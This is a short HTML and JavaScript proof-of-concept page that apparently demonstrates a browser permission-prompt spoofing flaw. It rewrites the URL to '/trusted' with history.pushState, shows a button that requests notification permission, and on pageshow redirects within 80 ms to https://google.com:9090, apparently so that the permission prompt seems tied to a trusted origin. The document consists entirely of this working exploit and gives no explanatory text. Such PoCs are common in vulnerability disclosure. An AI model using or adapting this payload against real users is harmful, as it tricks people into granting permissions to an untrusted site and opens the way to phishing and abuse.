<button id="start">Start PoC</button>
<button id="req" hidden>Request Notification</button>

<script>
start.onclick = () => {
  history.pushState({}, '', '/trusted');
  req.hidden = false;
};

req.onclick = () => {
  Notification.requestPermission();
};

window.addEventListener('pageshow', () => {
  setTimeout(() => {
    location.href = 'https://google.com:9090';
  }, 80);
});
</script>
